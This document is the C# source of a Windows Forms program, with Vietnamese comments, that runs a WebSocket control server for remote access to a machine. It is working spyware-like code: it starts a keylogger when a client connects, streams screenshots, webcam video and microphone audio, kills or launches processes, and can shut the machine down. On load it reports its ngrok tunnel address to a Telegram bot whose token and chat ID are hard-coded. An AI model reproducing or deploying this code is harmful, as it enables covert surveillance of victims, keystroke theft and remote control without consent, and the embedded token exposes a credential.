using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Threading;
using Microsoft.Win32;
using KeyLogger;
using Fleck;       // Thư viện WebSocket
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq; 

// THƯ VIỆN WEBCAM 
using AForge.Video;
using AForge.Video.DirectShow;

// THƯ VIỆN ÂM THANH (Cần cài NAudio qua NuGet)
using NAudio.Wave;

namespace server
{
    public partial class server : Form
    {
        // --- KHAI BÁO BIẾN TOÀN CỤC ---
        private WebSocketServer wss;
        private VideoCaptureDevice videoSource;
        private MemoryStream currentFrameStream;
        private object frameLock = new object();
        private Thread keylogThread;

        // --- KHAI BÁO BIẾN ÂM THANH (MỚI) ---
        private WaveInEvent waveSource = null;

        public server()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }

        // Hàm này sẽ tự động tìm link ngrok và gửi về Telegram
        public async void GuiLinkVeTelegram()
        {
            try
            {
                // 1. Đợi 5 giây để Ngrok kịp khởi động và lấy link
                await Task.Delay(5000);

                using (HttpClient client = new HttpClient())
                {
                    // 2. Lấy thông tin từ Ngrok đang chạy trên máy (cổng quản lý mặc định là 4040)
                    // Lưu ý: Đây là API nội bộ của Ngrok, máy nào chạy ngrok cũng có link này
                    string jsonNgrok = await client.GetStringAsync("http://localhost:4040/api/tunnels");

                    // 3. Phân tích để lấy đường link Public
                    JObject data = JObject.Parse(jsonNgrok);

                    // Lấy link TCP (thường nằm trong mảng tunnels)
                    string publicUrl = data["tunnels"][0]["public_url"].ToString();

                    // 4. Cấu hình Bot Telegram của bạn
                    string botToken = "8124299251:AAGy1fV1chUEFItCs3XeuO0dO7ko4nYQHCw"; 
                    string chatId = "7811754859";   
                    string noiDungTinNhan = $"⚡ Server Online!\nIP: {publicUrl}";

                    // 5. Gửi tin nhắn
                    string urlTelegram = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={noiDungTinNhan}";
                    await client.GetAsync(urlTelegram);
                }
            }
            catch (Exception ex)
            {
                // Nếu lỗi (ví dụ chưa bật ngrok), nó sẽ im lặng hoặc bạn có thể hiện thông báo để debug
                //MessageBox.Show("Lỗi gửi tin: " + ex.Message);
            }
        }

        // --- CÁC HÀM XỬ LÝ LOGIC ---

        private string GetAppPath(string appName)
        {
            appName = appName.Trim();
            if (appName.Contains("\\") || appName.Contains("/")) return appName;
            try
            {
                string[] pathsToScan = {
                    Environment.GetFolderPath(Environment.SpecialFolder.StartMenu),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu)
                };
                foreach (string rootPath in pathsToScan)
                {
                    if (Directory.Exists(rootPath))
                    {
                        string[] files = Directory.GetFiles(rootPath, "*" + appName + "*.lnk", SearchOption.AllDirectories);
                        if (files.Length > 0) return files[0];
                    }
                }
            }
            catch { }
            if (!appName.EndsWith(".exe")) appName += ".exe";
            string registryKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\" + appName;
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryKey)) { if (key != null) return key.GetValue("").ToString(); }
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryKey)) { if (key != null) return key.GetValue("").ToString(); }
            }
            catch { }
            return appName;
        }

        private void ProcessStartApp(string inputName)
        {
            try
            {
                string pathTorun = GetAppPath(inputName);
                ProcessStartInfo startInfo = new ProcessStartInfo(pathTorun);
                Process.Start(startInfo);
                if (Program.clientSocket != null) Program.clientSocket.Send("MSG|Đã mở thành công: " + pathTorun);
            }
            catch
            {
                if (Program.clientSocket != null) Program.clientSocket.Send("MSG|Server Lỗi: Không tìm thấy ứng dụng.");
            }
        }

        // --- XỬ LÝ WEBCAM ---
        private void StartWebcamEngine()
        {
            try
            {
                if (videoSource == null)
                {
                    FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    if (videoDevices.Count == 0) return;
                    string deviceMoniker = videoDevices[0].MonikerString;
                    videoSource = new VideoCaptureDevice(deviceMoniker);
                    videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                    videoSource.Start();
                }
            }
            catch { }
        }

        private void StopWebcam()
        {
            try
            {
                if (videoSource != null)
                {
                    if (videoSource.IsRunning)
                    {
                        videoSource.SignalToStop();
                        videoSource.WaitForStop();
                    }
                    videoSource = null;
                }
            }
            catch { }
        }

        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                using (Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone())
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        lock (frameLock) { currentFrameStream = new MemoryStream(ms.ToArray()); }
                    }
                }
            }
            catch { }
        }

        private void ProcessWebcam()
        {
            if (videoSource == null || !videoSource.IsRunning) { StartWebcamEngine(); Thread.Sleep(500); }
            try
            {
                byte[] buffer = null;
                lock (frameLock) { if (currentFrameStream != null && currentFrameStream.Length > 0) buffer = currentFrameStream.ToArray(); }

                if (buffer != null && Program.clientSocket != null)
                {
                    Program.clientSocket.Send(buffer);
                }
            }
            catch { }
        }

        // --- XỬ LÝ ÂM THANH (MỚI) ---
        private void StartAudioStream()
        {
            try
            {
                if (waveSource == null)
                {
                    waveSource = new WaveInEvent();
                    waveSource.DeviceNumber = 0; // Microphone mặc định
                    waveSource.WaveFormat = new WaveFormat(44100, 16, 1); // 44.1kHz, Mono
                    waveSource.BufferMilliseconds = 100; // Gửi mỗi 100ms để giảm độ trễ
                    waveSource.DataAvailable += new EventHandler<WaveInEventArgs>(waveSource_DataAvailable);
                    waveSource.StartRecording();
                }
            }
            catch { }
        }

        private void StopAudioStream()
        {
            try
            {
                if (waveSource != null)
                {
                    waveSource.StopRecording();
                    waveSource.Dispose();
                    waveSource = null;
                }
            }
            catch { }
        }

        private void waveSource_DataAvailable(object sender, WaveInEventArgs e)
        {
            try
            {
                if (Program.clientSocket != null)
                {
                    // Đóng gói thành chunk WAV nhỏ để decodeAudioData bên JS hiểu được
                    byte[] wavChunk = AddWavHeader(e.Buffer, e.BytesRecorded);
                    string base64Audio = Convert.ToBase64String(wavChunk);
                    Program.clientSocket.Send("AUDIO|" + base64Audio);
                }
            }
            catch { }
        }

        // Hàm hỗ trợ tạo header WAV cho từng gói tin
        private byte[] AddWavHeader(byte[] rawData, int bytesRecorded)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                // Tạo WavWriter tạm vào MemoryStream
                using (WaveFileWriter writer = new WaveFileWriter(ms, new WaveFormat(44100, 16, 1)))
                {
                    writer.Write(rawData, 0, bytesRecorded);
                }
                return ms.ToArray();
            }
        }

        // --- CÁC HÀM XỬ LÝ PROCESS & APPS ---

        // 1. Lấy tất cả Process (Chạy ngầm + Hiển thị)
        private void ProcessGetListApp()
        {
            try
            {
                Process[] processList = Process.GetProcesses();
                string data = "LISTAPP|";
                foreach (Process p in processList)
                {
                    data += $"{p.ProcessName},{p.Id};";
                }
                if (Program.clientSocket != null) Program.clientSocket.Send(data);
            }
            catch { }
        }

        // 2. Chỉ lấy các Ứng dụng có cửa sổ hiển thị
        private void ProcessGetApplications()
        {
            try
            {
                Process[] processList = Process.GetProcesses();
                string data = "LIST_REAL_APPS|";
                foreach (Process p in processList)
                {
                    if (!string.IsNullOrEmpty(p.MainWindowTitle))
                    {
                        string cleanTitle = p.MainWindowTitle.Replace(",", " ").Replace(";", " ");
                        data += $"{p.ProcessName},{p.Id},{cleanTitle};";
                    }
                }
                if (Program.clientSocket != null) Program.clientSocket.Send(data);
            }
            catch { }
        }

        private void ProcessKillApp(string idStr)
        {
            try
            {
                int pid = int.Parse(idStr);
                Process.GetProcessById(pid).Kill();
                Program.clientSocket.Send("MSG|Đã diệt ID: " + idStr);
            }
            catch (Exception ex)
            {
                if (Program.clientSocket != null) Program.clientSocket.Send("MSG|Lỗi: " + ex.Message);
            }
        }

        // --- CÁC HÀM KHÁC ---
        private void ProcessSendLog()
        {
            try
            {
                string logs = KeylogEngine.GetLogContent();
                KeylogEngine.ClearLog();
                if (string.IsNullOrEmpty(logs)) logs = " ";
                if (Program.clientSocket != null) Program.clientSocket.Send("LOG|" + logs);
            }
            catch { }
        }

        private void ProcessTakePicture()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bmp)) { g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size); }
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Png);
                        byte[] buffer = ms.ToArray();
                        if (Program.clientSocket != null) Program.clientSocket.Send(buffer);
                    }
                }
            }
            catch { }
        }

        private void ProcessRegistry(string param)
        {
            if (Program.clientSocket != null)
                Program.clientSocket.Send("MSG|Lệnh Registry đã nhận (Logic chưa cài đặt chi tiết).");
        }

        private void StartKeylogSystem()
        {
            if (keylogThread == null || !keylogThread.IsAlive)
            {
                keylogThread = new Thread(new ThreadStart(KeylogEngine.StartHook));
                keylogThread.SetApartmentState(ApartmentState.STA);
                keylogThread.IsBackground = true;
                keylogThread.Start();
            }
        }

        // --- KHỞI TẠO SERVER WEBSOCKET ---
        private void StartListening()
        {
            try
            {
                wss = new WebSocketServer("ws://0.0.0.0:5656");

                wss.Start(socket =>
                {
                    socket.OnOpen = () =>
                    {
                        Program.clientSocket = socket;
                        this.Invoke((MethodInvoker)delegate { button1.Text = "Client đã kết nối!"; });
                        StartKeylogSystem();
                    };

                    socket.OnClose = () =>
                    {
                        Program.clientSocket = null;
                        this.Invoke((MethodInvoker)delegate { button1.Text = "Đang chờ..."; });
                        StopWebcam();
                        StopAudioStream(); // Dừng âm thanh khi ngắt kết nối
                    };

                    socket.OnMessage = message =>
                    {
                        string[] parts = message.Split('|');
                        string cmd = parts[0];
                        string param = parts.Length > 1 ? message.Substring(cmd.Length + 1) : "";

                        switch (cmd)
                        {
                            case "HOOK": KeylogEngine.IsLogging = true; break;
                            case "UNHOOK": KeylogEngine.IsLogging = false; break;
                            case "PRINT": ProcessSendLog(); break;
                            case "TAKEPIC": ProcessTakePicture(); break;
                            case "TAKE": ProcessTakePicture(); break;
                            case "STREAM": ProcessTakePicture(); break;
                            case "WEBCAM": ProcessWebcam(); break;
                            case "STOP_CAM": StopWebcam(); break;

                            // --- LỆNH PROCESS ---
                            case "XEM": ProcessGetListApp(); break;
                            case "GET_APPS": ProcessGetApplications(); break;

                            case "KILLID": ProcessKillApp(param); break;
                            case "STARTID": ProcessStartApp(param); break;
                            case "REG_EDIT": ProcessRegistry(param); break;
                            case "SHUTDOWN": Process.Start("shutdown", "/s /t 0"); break;
                            case "REBOOT": Process.Start("shutdown", "/r /t 0"); break;

                            // --- LỆNH AUDIO (MỚI) ---
                            case "START_AUDIO": StartAudioStream(); break;
                            case "STOP_AUDIO": StopAudioStream(); break;

                            case "QUIT": socket.Close(); break;
                        }
                    };
                });
            }
            catch (Exception ex) { MessageBox.Show("Lỗi Server: " + ex.Message); }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            button1.Enabled = false;
            button1.Text = "Server đang chạy (WS)...";
            StartListening();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            try
            {
                if (wss != null) wss.Dispose();
                StopWebcam();
                StopAudioStream(); // Dừng âm thanh khi đóng form
                if (keylogThread != null && keylogThread.IsAlive) keylogThread.Abort();
                KeylogEngine.StopHook();
                Environment.Exit(0);
            }
            catch { }
        }

        private void server_Load(object sender, EventArgs e)
        {
            GuiLinkVeTelegram();
        }
    }
}